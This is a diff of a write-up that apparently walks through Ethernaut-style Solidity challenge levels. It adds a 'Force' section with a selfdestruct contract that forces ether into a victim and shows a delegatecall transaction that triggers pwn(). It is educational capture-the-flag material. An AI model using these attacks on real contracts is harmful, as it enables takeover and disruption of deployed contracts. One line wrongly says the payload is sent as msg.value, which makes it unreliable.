@@ -67,12 +67,32 @@ Be careful of integer over/underflow. Always use safemath libraries. Basically I
 await contract.transfer(instance, 25)
 ```
 
-
 ## 6. Delegation
 Be very very careful when using delegatecall. msg.sender, msg.data, msg.value are all preserved. Always do a check to ensure that msg.data.length == 0 if you don't want them to call any function. https://solidity.readthedocs.io/en/v0.4.25/types.html#address for more info. All I had to do was trigger the fallback function (note that it is not payable) with "pwn()" as the msg.value. https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-sendtransaction
 ```
 await contract.sendTransaction({data: web3.sha3("pwn()").slice(0, 10)})
 ```
+
+## 7. Force
+Even though your contract may not have a payable fallback function, you can still force ether transfers into your contract via selfdestruct or transaction fee rewards for mining a block. Do not ever assume that your contract will always have 0 balance and use it as part of validation.
+```
+pragma solidity ^0.4.24;
+
+contract hackIt {
+    
+    address private _victim;
+    
+    constructor(address victim) public payable {
+        _victim = victim;
+    }
+    
+    function forceTransfer() public {
+        selfdestruct(_victim);
+    }
+}
+```
+
+## 8. Vault
 
 
 
